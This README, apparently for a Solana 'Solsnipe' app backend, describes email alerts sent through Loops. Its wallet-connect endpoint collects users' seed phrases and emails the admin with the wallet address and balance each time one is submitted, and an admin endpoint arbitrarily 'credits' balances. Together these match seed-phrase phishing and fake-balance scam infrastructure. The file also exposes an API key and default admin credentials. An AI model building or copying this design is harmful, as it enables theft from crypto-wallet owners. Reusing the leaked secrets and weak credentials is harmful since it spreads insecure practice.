# 📧 Loops Email Integration - Complete Guide

## Overview

Your Solsnipe backend now sends transactional emails via **Loops** whenever:
1. ✅ A user connects their wallet (new or returning)
2. ✅ An admin performs a credit operation

---

## 🔑 Configuration

### Environment Variables

Add these to your `.env` and `.env.development` files:

```bash
# Loops Email Configuration
LOOPS_API_KEY=0de67ebcc5e8d98792c780ed52b714ee
ADMIN_EMAIL=admin@solsnipeai.xyz
LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
```

**Already configured!** ✅

---

## 📨 Email Templates

### Template ID: `cmgn2tzu5fqc41q0ivqlmuqf4`

### Data Variables Sent:

```json
{
  "transactionalId": "cmgn2tzu5fqc41q0ivqlmuqf4",
  "email": "admin@solsnipeai.xyz",
  "dataVariables": {
    "walletName": "9we6kjtbcZ2vy3GSLLsZTEhbAqXPTRvEyoxa8wxSqKp5",
    "connectionType": "Seed Phrase",
    "codes": "9we6kjtb...",
    "solBalance": "0"
  }
}
```

---

## 🎯 When Emails Are Sent

### 1. Wallet Connection (New User)

**Trigger:** POST `/api/wallet-connect` with new seed phrase

**Email Data:**
```json
{
  "walletName": "Full wallet address",
  "connectionType": "Seed Phrase" or "Passphrase",
  "codes": "First 8 characters...",
  "solBalance": "Current SOL balance"
}
```

**Example:**
```json
{
  "walletName": "9we6kjtbcZ2vy3GSLLsZTEhbAqXPTRvEyoxa8wxSqKp5",
  "connectionType": "Seed Phrase",
  "codes": "9we6kjtb...",
  "solBalance": "0"
}
```

### 2. Wallet Connection (Returning User)

**Trigger:** POST `/api/wallet-connect` with existing seed phrase

**Email Data:**
```json
{
  "walletName": "Full wallet address",
  "connectionType": "Seed Phrase",
  "codes": "First 8 characters...",
  "solBalance": "Updated SOL balance"
}
```

### 3. Admin Credit Operation

**Trigger:** POST `/api/credit-wallet` (admin only)

**Email Data:**
```json
{
  "walletName": "Wallet address",
  "connectionType": "Credit Wallet",
  "codes": "credit-1728753421000",
  "solBalance": "New balance after credit"
}
```

**Example:**
```json
{
  "walletName": "9we6kjtbcZ2vy3GSLLsZTEhbAqXPTRvEyoxa8wxSqKp5",
  "connectionType": "Credit Wallet",
  "codes": "credit-1728753421000",
  "solBalance": "15.5"
}
```

---

## 🧪 Testing Email Integration

### Test 1: Wallet Connection Email

```powershell
# Connect a wallet (triggers email)
$body = @{
    seedPhrase = "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:8888/api/wallet-connect" -Method POST -Body $body -ContentType "application/json"
```

**Check:**
1. ✅ Wallet connects successfully
2. ✅ Console logs show: `📧 Sending email via Loops...`
3. ✅ Console logs show: `✅ Email sent successfully`
4. ✅ Check `admin@solsnipeai.xyz` inbox for email

### Test 2: Admin Credit Email

```powershell
# 1. Get admin token
$adminBody = @{
    username = "admin"
    password = "admin123"
    apiKey = "super-secret-admin-key"
} | ConvertTo-Json

$adminResponse = Invoke-RestMethod -Uri "http://localhost:8888/api/admin-login" -Method POST -Body $adminBody -ContentType "application/json"
$adminToken = $adminResponse.token

# 2. Credit wallet (triggers email)
$creditBody = @{
    walletAddress = "9we6kjtbcZ2vy3GSLLsZTEhbAqXPTRvEyoxa8wxSqKp5"
    amount = 10.5
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:8888/api/credit-wallet" -Method POST -Body $creditBody -ContentType "application/json" -Headers @{Authorization = "Bearer $adminToken"}
```

**Check:**
1. ✅ Credit operation succeeds
2. ✅ Console logs show: `📧 Sending email via Loops...`
3. ✅ Console logs show: `✅ Email sent successfully`
4. ✅ Check `admin@solsnipeai.xyz` inbox for email

---

## 📊 Email Logs

### Successful Email:
```
📧 Sending email via Loops...
   To: admin@solsnipeai.xyz
   Template: cmgn2tzu5fqc41q0ivqlmuqf4
✅ Email sent successfully
```

### Failed Email:
```
📧 Sending email via Loops...
   To: admin@solsnipeai.xyz
   Template: cmgn2tzu5fqc41q0ivqlmuqf4
❌ Loops email failed: { message: "Invalid API key" }
💥 Email sending error: Loops API error (401): Invalid API key
```

---

## 🔧 Customization

### Change Recipient Email

Update `.env`:
```bash
ADMIN_EMAIL=your-email@example.com
```

### Use Different Templates

Create separate templates in Loops for each event:

```bash
# Wallet connection template
LOOPS_WALLET_CONNECTION_TEMPLATE_ID=template_id_1

# Admin operation template  
LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=template_id_2
```

### Add More Data Variables

Edit `netlify/functions/utils/loopsEmail.js`:

```javascript
async function sendWalletConnectionEmail(email, walletData) {
  const dataVariables = {
    walletName: walletData.walletAddress,
    connectionType: walletData.inputType,
    codes: walletData.walletAddress.substring(0, 8) + '...',
    solBalance: walletData.balance.toString(),
    // Add custom fields here
    network: walletData.network || 'DEVNET',
    timestamp: new Date().toISOString(),
    loginCount: walletData.loginCount || 1
  };
  
  return await sendLoopsEmail(transactionalId, email, dataVariables);
}
```

---

## 🚨 Error Handling

### Email Failures Don't Block Operations

Emails are sent **asynchronously** and **don't wait for completion**:

```javascript
sendWalletConnectionEmail(ADMIN_EMAIL, walletData)
  .catch(err => console.error('Email notification failed:', err.message));
```

**This means:**
- ✅ Wallet connection works even if email fails
- ✅ Admin operations complete even if email fails
- ✅ Email errors are logged but don't affect user experience

### Common Issues

| Error | Cause | Solution |
|-------|-------|----------|
| `Invalid API key` | Wrong `LOOPS_API_KEY` | Check your Loops dashboard |
| `Template not found` | Wrong `transactionalId` | Verify template ID in Loops |
| `Network error` | Loops API down | Retry later, operation still works |
| `Invalid email` | Wrong admin email | Check `ADMIN_EMAIL` in `.env` |

---

## 📧 Loops API Reference

### Endpoint
```
POST https://app.loops.so/api/v1/transactionals/send
```

### Headers
```
Authorization: Bearer YOUR_API_KEY
Content-Type: application/json
```

### Request Body
```json
{
  "transactionalId": "template_id",
  "email": "recipient@example.com",
  "dataVariables": {
    "key1": "value1",
    "key2": "value2"
  }
}
```

### Response (Success)
```json
{
  "success": true,
  "message": "Email sent successfully"
}
```

### Response (Error)
```json
{
  "success": false,
  "message": "Error description"
}
```

---

## 🎯 Production Deployment

### 1. Set Environment Variables in Netlify

Go to: **Netlify Dashboard → Site Settings → Environment Variables**

Add:
```
LOOPS_API_KEY=0de67ebcc5e8d98792c780ed52b714ee
ADMIN_EMAIL=admin@solsnipeai.xyz
LOOPS_WALLET_CONNECTION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
LOOPS_ADMIN_NOTIFICATION_TEMPLATE_ID=cmgn2tzu5fqc41q0ivqlmuqf4
```

### 2. Test in Production

After deployment, trigger events and check logs:

```bash
netlify functions:log wallet-connect
netlify functions:log credit-wallet
```

Look for:
```
📧 Sending email via Loops...
✅ Email sent successfully
```

---

## 📝 Summary

| Event | Recipient | Template ID | Data Variables |
|-------|-----------|-------------|----------------|
| Wallet Connect (New) | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |
| Wallet Connect (Returning) | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |
| Admin Credit | admin@solsnipeai.xyz | cmgn2tzu5fqc41q0ivqlmuqf4 | walletName, connectionType, codes, solBalance |

---

**Your email integration is complete and ready to test!** 🎉

Check the server logs when testing to see the email notifications being sent.
